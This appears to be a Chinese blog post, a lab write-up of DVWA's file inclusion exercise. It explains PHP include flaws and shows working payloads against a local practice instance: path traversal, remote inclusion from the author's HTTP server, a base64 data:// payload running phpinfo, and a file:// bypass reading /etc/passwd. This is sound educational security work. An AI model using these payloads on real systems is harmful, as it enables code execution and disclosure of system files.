<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 这次玩一下 DVWA 的文件包含。 原理 PHP和include 在 php 语言中 include 表达式用于包含指定的文件，写过 C/C++ 应该对 #include 预处理指令比较熟，php 的 include 表达式"><title>DVWA上手记录-文件包含</title>
<link rel=canonical href=https://nnnewb.github.io/p/get-start-dvwa-04/>
<link rel=stylesheet href=/scss/style.min.709d4f89582c5a09dc94158a722a16093cdffe24d9a8c77dd3f422c786203c41.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale('zh-cn'),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="DVWA上手记录-文件包含">
<meta property="og:description" content="前言 这次玩一下 DVWA 的文件包含。 原理 PHP和include 在 php 语言中 include 表达式用于包含指定的文件，写过 C/C++ 应该对 #include 预处理指令比较熟，php 的 include 表达式">
<meta property="og:url" content="https://nnnewb.github.io/p/get-start-dvwa-04/">
<meta property="og:site_name" content="weakptr's 笔记">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="DVWA"><meta property="article:published_time" content="2022-04-26T15:07:00+08:00"><meta property="article:modified_time" content="2022-04-26T15:07:00+08:00">
<meta name=twitter:title content="DVWA上手记录-文件包含">
<meta name=twitter:description content="前言 这次玩一下 DVWA 的文件包含。 原理 PHP和include 在 php 语言中 include 表达式用于包含指定的文件，写过 C/C++ 应该对 #include 预处理指令比较熟，php 的 include 表达式">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.setItem(a,"light")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/>
<img src=/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>🍑</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/>weakptr's 笔记</a></h1>
<h2 class=site-description>弃船！</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>首页</span>
</a>
</li>
<li>
<a href=/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于我</span>
</a>
</li>
<li>
<a href=/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span>
</a>
</li>
<li>
<a href=/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>分类</span>
</a>
</li>
<li>
<a href=/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>标签</span>
</a>
</li>
<li>
<a href=/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>友链</span>
</a>
</li>
<li>
<a href=/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span>
</a>
</li>
<div class=menu-bottom-section>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/p/get-start-dvwa-04/>DVWA上手记录-文件包含</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2022-04-26T15:07:00+08:00>2022年 4月 26日</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 5 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=前言>前言</h2>
<p>这次玩一下 DVWA 的文件包含。</p>
<h2 id=原理>原理</h2>
<h3 id=php和include>PHP和include</h3>
<p>在 php 语言中 <code>include</code> 表达式用于包含指定的文件，写过 C/C++ 应该对 <code>#include</code> 预处理指令比较熟，php 的 <code>include</code> 表达式和 <code>#include</code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 <code>#include</code> 预处理器比较像。</p>
<p>然后，因为 <code>include</code> 可以写做表达式的缘故，在 php 里可以 <code>include $file</code>，如果把用户传入的数据未经过检查就交给 <code>include</code> 的话就可能产生一个文件包含漏洞。</p>
<blockquote>
<p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在<a class=link href=https://www.php.net/manual/zh/language.basic-syntax.phpmode.php target=_blank rel=noopener>有效的 PHP 起始和结束标记</a>之中。</p>
</blockquote>
<p>解释器的这个行为进一步拓宽了可利用的范围。</p>
<blockquote>
<p>如果“<a class=link href=https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include target=_blank rel=noopener>URL include wrappers</a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见<a class=link href=https://www.php.net/manual/zh/wrappers.php target=_blank rel=noopener>支持的协议和封装协议</a>）而不是本地文件来指定要被包含的文件。</p>
</blockquote>
<p>对 <code>include</code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。</p>
<h3 id=本地文件包含>本地文件包含</h3>
<p>本地文件包含一般可以是 <code>include "some/folder/" . $_GET["file"] . ".php"</code> 或类似的形式，此时可以通过 <code>file=../../malicious</code> 这样的 payload 来包含任意代码。</p>
<h3 id=远程文件包含>远程文件包含</h3>
<p>此时对 <code>include</code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 <code>zlib://</code> 之类的协议直接把要执行的代码放在 payload 里。</p>
<h2 id=文件包含>文件包含</h2>
<h3 id=信息收集>信息收集</h3>
<p><img src=/p/get-start-dvwa-04/image-20220426140326609.png width=694 height=206 srcset="/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426140326609 class=gallery-image data-flex-grow=336 data-flex-basis=808px></p>
<p>页面没有什么特别的，点击上面的 <code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 能分别看到三个不同的子页面：</p>
<p><img src=/p/get-start-dvwa-04/image-20220426140433312.png width=681 height=289 srcset="/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426140433312 class=gallery-image data-flex-grow=235 data-flex-basis=565px></p>
<p><img src=/p/get-start-dvwa-04/image-20220426140441863.png width=686 height=294 srcset="/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426140441863 class=gallery-image data-flex-grow=233 data-flex-basis=560px></p>
<p><img src=/p/get-start-dvwa-04/image-20220426140450138.png width=692 height=345 srcset="/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426140450138 class=gallery-image data-flex-grow=200 data-flex-basis=481px></p>
<p>注意地址栏会发现有意思的地方：</p>
<ul>
<li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php</li>
<li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php</li>
<li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php</li>
<li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php</li>
</ul>
<p>很直接地想到 <code>index.php</code>、<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code>就是被包含的文件了。尝试提交一个 <code>page=file4.php</code>，发现彩蛋。</p>
<p><img src=/p/get-start-dvwa-04/image-20220426140828383.png width=675 height=158 srcset="/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426140828383 class=gallery-image data-flex-grow=427 data-flex-basis=1025px></p>
<p>直接观察 dvwa 源码，可以发现 <code>include</code> 出现的位置是 <code>dvwa/vulnerabilities/fi/index.php</code> 里，<code>php.ini</code> 配置的 <code>include_path</code> 应该是包含当前目录 <code>.</code> 的，所以可以直接取相对路径包含任意文件。</p>
<p>差不多就是这样了。</p>
<h3 id=low难度>Low难度</h3>
<p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。</p>
<p><img src=/p/get-start-dvwa-04/image-20220426141056540.png width=1266 height=325 srcset="/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426141056540 class=gallery-image data-flex-grow=389 data-flex-basis=934px></p>
<p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 <code>/dev/stdout</code> 和 <code>/dev/stderr</code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。</p>
<p>先试一下远程文件包含。<code>python3 -m http.server</code>开个 http 服务器，下面放个 <code>2.php</code>，然后构造 url：<code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php</code></p>
<p><img src=/p/get-start-dvwa-04/image-20220426142642274.png width=1323 height=287 srcset="/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426142642274 class=gallery-image data-flex-grow=460 data-flex-basis=1106px></p>
<p>成功。</p>
<h3 id=提高难度medium>提高难度：Medium</h3>
<p>看看 Medium 难度下的代码。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=c1>// The page we wish to display
</span><span class=c1></span><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;page&#39;</span> <span class=p>];</span>

<span class=c1>// Input validation
</span><span class=c1></span><span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=k>array</span><span class=p>(</span> <span class=s2>&#34;http://&#34;</span><span class=p>,</span> <span class=s2>&#34;https://&#34;</span> <span class=p>),</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$file</span> <span class=p>);</span>
<span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=k>array</span><span class=p>(</span> <span class=s2>&#34;../&#34;</span><span class=p>,</span> <span class=s2>&#34;..</span><span class=se>\\</span><span class=s2>&#34;</span> <span class=p>),</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$file</span> <span class=p>);</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></td></tr></table>
</div>
</div><p>用 <code>str_replace</code> 替换掉了 <code>../</code> 和 <code>http://</code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩&mldr;</p>
<p>改成<code>data://</code>协议，重写一个 payload：<code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=</code>。这段 base64 是 <code> echo '&lt;?php phpinfo(); ?>' | base64</code> 产生的。</p>
<p><img src=/p/get-start-dvwa-04/image-20220426143248441.png width=1271 height=330 srcset="/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426143248441 class=gallery-image data-flex-grow=385 data-flex-basis=924px></p>
<p>成功。</p>
<h3 id=提高难度high>提高难度：High</h3>
<p>High 难度下使用了 <code>fnmatch</code> 匹配文件名，但模式是 <code>file*</code>，所以还是有完蛋的可能。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=c1>// The page we wish to display
</span><span class=c1></span><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;page&#39;</span> <span class=p>];</span>

<span class=c1>// Input validation
</span><span class=c1></span><span class=k>if</span><span class=p>(</span> <span class=o>!</span><span class=nx>fnmatch</span><span class=p>(</span> <span class=s2>&#34;file*&#34;</span><span class=p>,</span> <span class=nv>$file</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;include.php&#34;</span> <span class=p>)</span> <span class=p>{</span>
    <span class=c1>// This isn&#39;t the page we want!
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;ERROR: File not found!&#34;</span><span class=p>;</span>
    <span class=k>exit</span><span class=p>;</span>
<span class=p>}</span>

<span class=cp>?&gt;</span><span class=err>
</span></code></pre></td></tr></table>
</div>
</div><p>先试一下能不能用<code>file://</code>来 bypass 掉这个模式匹配。</p>
<p><img src=/p/get-start-dvwa-04/image-20220426143800394.png width=1044 height=320 srcset="/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_480x0_resize_box_3.png 480w, /p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220426143800394 class=gallery-image data-flex-grow=326 data-flex-basis=783px></p>
<p>好的，成功 bypass 掉了这个模式，并且包含 <code>/etc/passwd</code> 成功了。不过<code>/etc/shadow</code>就没权限了。</p>
<p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。</p>
<p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。</p>
<h3 id=帮助文档>帮助文档</h3>
<p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。</p>
<blockquote>
<p><strong>Objective</strong></p>
<p>Read all five famous quotes from &lsquo;<a class=link href=http://localhost:8080/hackable/flags/fi.php target=_blank rel=noopener>../hackable/flags/fi.php</a>&rsquo; using only the file inclusion.</p>
</blockquote>
<p>哦？目标是获取 <code>hackable</code>下的 flag。稍改下 payload 很快就拿到了<code>fi.php</code>的内容。</p>
<blockquote>
<p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&rsquo;t know.</p>
<p>&ndash;LINE HIDDEN ;)&ndash;</p>
<p>4.) The pool on the roof must have a leak.</p>
</blockquote>
<p>这个 <code>LINE HIDDEN</code> 有点怪，不是说 <code>five famous quotes</code> 吗，这只有4条。于是看了眼 <code>fi.php</code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 <code>fi.php</code> 下载下来，不然单纯包含这个文件肯定是不行的。</p>
<p>impossible 难度代码长这样：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=c1>// The page we wish to display
</span><span class=c1></span><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;page&#39;</span> <span class=p>];</span>

<span class=c1>// Only allow include.php or file{1..3}.php
</span><span class=c1></span><span class=k>if</span><span class=p>(</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;include.php&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;file1.php&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;file2.php&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$file</span> <span class=o>!=</span> <span class=s2>&#34;file3.php&#34;</span> <span class=p>)</span> <span class=p>{</span>
	<span class=c1>// This isn&#39;t the page we want!
</span><span class=c1></span>	<span class=k>echo</span> <span class=s2>&#34;ERROR: File not found!&#34;</span><span class=p>;</span>
	<span class=k>exit</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>硬编码了所有可能的文件，如此一来就没有利用空间了。</p>
<h2 id=总结>总结</h2>
<p>文件包含这题感觉有点emmm</p>
<p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。</p>
<p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。</p>
<p>烦心。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/security/>security</a>
<a href=/tags/dvwa/>DVWA</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>相关文章</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/p/get-start-dvwa-05/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-文件上传</h2>
</div>
</a>
</article>
<article>
<a href=/p/get-start-dvwa-03/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-CSRF</h2>
</div>
</a>
</article>
<article>
<a href=/p/get-start-dvwa-02/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-简单尝试</h2>
</div>
</a>
</article>
<article>
<a href=/p/get-start-dvwa-01/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>DVWA上手记录-初体验</h2>
</div>
</a>
</article>
<article>
<a href=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>几个简单的 pwn 练习</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2024 weakptr's 笔记
</section>
<section class=powerby>
<a href=https://beian.miit.gov.cn/>浙ICP备2021032371号-1</a>
<span style=margin-left:16px></span>
<a target=_blank href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33032402002231" style=display:inline-block;text-decoration:none;height:20px;line-height:20px>
<img src=/blog/image/beian.png style=float:left>
浙公网安备 33032402002231号
</a>
<br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#前言>前言</a></li>
<li><a href=#原理>原理</a>
